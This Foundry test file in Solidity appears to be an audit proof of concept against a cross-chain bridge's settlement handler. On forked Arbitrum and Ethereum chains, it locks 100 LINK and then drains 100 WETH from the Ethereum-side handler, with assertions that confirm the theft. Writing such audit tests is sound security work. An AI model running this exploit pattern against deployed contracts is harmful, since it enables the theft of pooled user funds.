// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "../../../lib/forge-std/src/Test.sol"; 

import {ChakraSettlementHandler} from "../../../solidity/handler/contracts/ChakraSettlementHandler.sol"; 

import {BaseSettlementHandler} from "../../../solidity/handler/contracts/BaseSettlementHandler.sol"; 

import {ChakraToken} from "../../../solidity/handler/contracts/ChakraToken.sol"; 

import {ERC20CodecV1} from "../../../solidity/handler/contracts/ERC20CodecV1.sol"; 

import {IERC20CodecV1} from "../../../solidity/handler/contracts/interfaces/IERC20CodecV1.sol"; 

import {ChakraSettlement} from "../../../solidity/settlement/contracts/ChakraSettlement.sol";

import {SettlementSignatureVerifier} from "../../../solidity/handler/contracts/SettlementSignatureVerifier.sol";

import {ISettlementSignatureVerifier} from "../../../solidity/handler/contracts/interfaces/ISettlementSignatureVerifier.sol";

import {ISettlement} from "../../../solidity/handler/contracts/interfaces/ISettlement.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { PayloadType, CrossChainMsgStatus } from "../../../solidity/settlement/contracts/libraries/Message.sol";

import {ERC20TransferPayload} from "../../../solidity/handler/contracts/libraries/ERC20Payload.sol";

import {ERC20Method} from "../../../solidity/handler/contracts/libraries/ERC20Payload.sol";

import {AddressCast} from "../../../solidity/handler/contracts/libraries/AddressCast.sol";

import {Message} from "../../../solidity/settlement/contracts/libraries/Message.sol";

import {MessageV1Codec} from "../../../solidity/settlement/contracts/libraries/MessageV1Codec.sol";

contract GeneralTestLockUnlockNotUsingChakraToken is Test{

    uint256 ethFork; 
    uint256 arbFork;
    uint256 baseFork; 

//ARB
ChakraSettlementHandler public chakraSettlementHandlerArb; 

address public LINK_arb = 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4; 

ERC20CodecV1 public codecArb; 

ChakraSettlement public chakraSettlementArb; 

SettlementSignatureVerifier public settlementSignatureVerifierArb; 

//ETH
ChakraSettlementHandler public chakraSettlementHandlerEth; 

address public LINK_eth = 0x514910771AF9Ca656af840dff83E8264EcF986CA; 

address public WETH_eth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; 

ERC20CodecV1 public codecEth; 

ChakraSettlement public chakraSettlementEth; 

SettlementSignatureVerifier public settlementSignatureVerifierEth; 


address public bob = makeAddr("bob");
address public tob = makeAddr("tob");

address public owner; 
   
function setUp() public {
initializeOnArbitrum();
initializeOnEthereum();
}

function initializeOnArbitrum() public {
arbFork = vm.createFork("use your own rpc url");
vm.selectFork(arbFork);
owner = address(this); 

//settlementSignatureVerifier 
settlementSignatureVerifierArb = new SettlementSignatureVerifier(); 
//settlementSignatureVerifier initialized
settlementSignatureVerifierArb.initialize(address(this), 1);

//codec
codecArb = new ERC20CodecV1(); 
//codec initialized
codecArb.initialize(address(this));

//chakraSettlement
chakraSettlementArb = new ChakraSettlement();
address[] memory managers = new address[](2); 
managers[0] = bob; 
managers[1] = tob; 
chakraSettlementArb.initialize("Abitrum", 137, owner, managers, 1, address(settlementSignatureVerifierArb));

//chakraSettlementHandler
chakraSettlementHandlerArb = new ChakraSettlementHandler();
chakraSettlementHandlerArb.initialize(owner, BaseSettlementHandler.SettlementMode.LockUnlock, "Arbitrum", address(LINK_arb), address(codecArb), address(settlementSignatureVerifierArb), address(chakraSettlementArb));

}

function initializeOnEthereum() public {
ethFork = vm.createFork("use your own rpc url");
vm.selectFork(ethFork);
owner = address(this); 

//settlementSignatureVerifier 
settlementSignatureVerifierEth = new SettlementSignatureVerifier(); 
//settlementSignatureVerifier initialized
settlementSignatureVerifierEth.initialize(address(this), 1);

//codec
codecEth = new ERC20CodecV1(); 
//codec initialized
codecEth.initialize(address(this));

//chakraSettlement
chakraSettlementEth = new ChakraSettlement();
address[] memory managers = new address[](2); 
managers[0] = bob; 
managers[1] = tob; 
chakraSettlementEth.initialize("Ethereum", 1, owner, managers, 1, address(settlementSignatureVerifierEth));

//chakraSettlementHandler
chakraSettlementHandlerEth = new ChakraSettlementHandler();
chakraSettlementHandlerEth.initialize(owner, BaseSettlementHandler.SettlementMode.LockUnlock, "Ethereum", address(WETH_eth), address(codecEth), address(settlementSignatureVerifierEth), address(chakraSettlementEth));
}

//@audit high, Malicious users could drain the settlements handler by receiving more than what they locked.
function test_MaliciousUsersCanPerformCrossChainTxsReceivingWayMoreValueThanWhatTheyLocked() public {
//Note: the required validators is setted to 1, all the contracts have been initializated and the mode is setted to LockUnlock.
uint256 privateKeyValidator1 = 0x12D; 
address validator1 = vm.addr(privateKeyValidator1);

address UserAccount1 = makeAddr("UserAccount1");

//Here owner Adds managers to both chains (arbitrum and ethereum)
vm.selectFork(arbFork);
vm.startPrank(owner);
settlementSignatureVerifierArb.add_manager(bob);
vm.selectFork(ethFork);
settlementSignatureVerifierEth.add_manager(bob);
vm.stopPrank(); 

//Here owner Adds validators to both chains (arbitrum and ethereum)
vm.startPrank(bob);
vm.selectFork(arbFork);
settlementSignatureVerifierArb.add_validator(validator1);
vm.selectFork(ethFork);
settlementSignatureVerifierEth.add_validator(validator1);
vm.stopPrank();

//Here owner adds valid handler on Arbitrum
vm.selectFork(ethFork);
vm.startPrank(owner); 
chakraSettlementHandlerEth.add_handler("Arbitrum", uint160(address(chakraSettlementHandlerArb)));
vm.stopPrank();

vm.startPrank(UserAccount1);
vm.selectFork(arbFork);

//payload 
//Here there is a anticipated calculation of the cross chain tx payload, that will be used later in this test.
bytes memory payload;
uint256 crosschain_counter_msg = 1; 
uint256 nonce = 1; 
uint256 cross_chain_msg_id = uint256(keccak256(abi.encodePacked(crosschain_counter_msg,address(chakraSettlementHandlerArb), UserAccount1,nonce)));

ERC20TransferPayload memory _payload = ERC20TransferPayload(
ERC20Method.Transfer, 
AddressCast.to_uint256(UserAccount1), 
uint160(UserAccount1),
AddressCast.to_uint256(address(LINK_arb)),
uint160(address(WETH_eth)), 
100e18
);

Message memory cross_chain_msg = Message(
cross_chain_msg_id, 
PayloadType.ERC20, 
codecArb.encode_transfer(_payload)
);

payload = MessageV1Codec.encode(cross_chain_msg);

//Give 100 LINK to user on arbitrum
deal(address(LINK_arb), UserAccount1, 100e18); 
//Approve the arbitrum handler to lock 100 LINK
IERC20(address(LINK_arb)).approve(address(chakraSettlementHandlerArb), 100e18);
//Send the cross chain tx, and lock 100 LINK on arbitrum
chakraSettlementHandlerArb.cross_chain_erc20_settlement("Ethereum", uint160(address(chakraSettlementHandlerEth)), uint160(WETH_eth), uint160(UserAccount1), 100e18);
vm.stopPrank();

uint256 nonce_manager = 1; 
uint8 sign_type = 0; 
uint256 txId = uint256(keccak256(abi.encodePacked("Arbitrum", "Ethereum", UserAccount1, (address(chakraSettlementHandlerArb)),uint160(address(chakraSettlementHandlerEth)), nonce_manager)));

vm.startPrank(validator1);
//The validator signs the message and accepts the transaction
(uint8 v,bytes32 r, bytes32 s) = vm.sign(privateKeyValidator1, 0xfdc94ed6e5a211b1315264e3bbda6e278e97b08ef27dd6ba036d1976c41b085c);//Here we can note a byte value, it is the message_hash and has been retrieved using the Foundry console with the command -vvv
bytes memory signature = abi.encodePacked(r, s, v);
vm.selectFork(ethFork);
//Let's assign 100 weth to the WETH ethereum handler, (these funds can be in the contract also via locking from others users).
deal(WETH_eth, address(chakraSettlementHandlerEth), 100e18); 
chakraSettlementEth.receive_cross_chain_msg(txId, "Arbitrum", uint160(UserAccount1), uint160(address(chakraSettlementHandlerArb)), address(chakraSettlementHandlerEth), PayloadType.ERC20, payload, sign_type, signature);
vm.stopPrank();

//On eth these are the balances results:
assertEq(IERC20(WETH_eth).balanceOf(UserAccount1), 100e18); //Now the malicious user has 100 weth on ethereum
assertEq(IERC20(WETH_eth).balanceOf(address(chakraSettlementHandlerEth)), 0); //Now the settlement handler on ethereum has 0 weth, since it has been drained by the user spending only 100 LINK

vm.selectFork(arbFork);
//On arb these are the balances results:
assertEq(IERC20(LINK_arb).balanceOf(UserAccount1), 0); //Now the malicious user has 0 LINK on arbitrum
assertEq(IERC20(LINK_arb).balanceOf(address(chakraSettlementHandlerArb)), 100e18); //Now the settlement handler on arbitrum has 100 LINK.
}

}